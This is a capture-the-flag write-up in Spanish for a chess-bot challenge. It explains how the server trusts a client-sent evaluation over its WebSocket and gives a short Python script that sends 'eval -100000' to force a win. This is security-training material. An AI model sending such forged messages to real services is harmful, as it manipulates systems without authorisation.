## Descripcion
Can you win in a convincing manner against this chess bot? He won't go easy on you! You can find the challenge [here](http://xebec.cylabacademy.net:48496/).
## Solucion
## 1. Acceso al reto

Se accedió al sitio proporcionado:

```
http://xebec.cylabacademy.net:48496/
```

La página muestra un tablero de ajedrez y permite jugar contra un bot.

## 2. Análisis de la comunicación

Al revisar la aplicación y las herramientas de desarrollador del navegador, se observó que utiliza un WebSocket para comunicarse con el servidor.

La ruta utilizada por la aplicación es:

```
/ws/
```

También se encontró que los mensajes enviados al servidor utilizan el formato:

```
eval VALOR
```

Por ejemplo:

```
eval 0
```

## 3. Problema encontrado en el navegador

Se intentó enviar directamente desde la consola:

```
sendMessage("eval -999999")
```

Sin embargo, la conexión WebSocket no estaba establecida correctamente y apareció:

```
Failed to load resource: the server responded with a status of 404 (Not Found)
```

Por esta razón se decidió realizar la conexión directamente desde Python.

## 4. Creación del exploit

Se creó un archivo llamado:

```
solve.py
```

con el siguiente código:

```
import asyncio
import websockets

async def main():
    uri = "ws://xebec.cylabacademy.net:48496/ws/"

    async with websockets.connect(uri) as ws:
        await ws.send("eval -100000")
        respuesta = await ws.recv()
        print(respuesta)

asyncio.run(main())
```

## 5. Instalación de la librería

En Kali Linux se instaló la librería necesaria con:

```
sudo apt install python3-websockets
```

En caso de no estar disponible mediante APT, también puede instalarse utilizando un entorno virtual:

```
python3 -m venv venv
source venv/bin/activate
pip install websockets
```

## 6. Ejecución del exploit

Se ejecutó el programa con:

```
python3 solve.py
```

El script establece una conexión WebSocket con:

```
ws://xebec.cylabacademy.net:48496/ws/
```

y posteriormente envía:

```
eval -100000
```

## 7. Explotación

El valor enviado representa una evaluación extremadamente negativa para la posición del bot.

Al utilizar:

```
eval -100000
```

el servidor interpreta que la situación del bot es extremadamente desfavorable.

La aplicación confía en el valor proporcionado por el cliente en lugar de verificar correctamente que la evaluación corresponda con la posición real del tablero.
## Notas adicionales

## Referencias
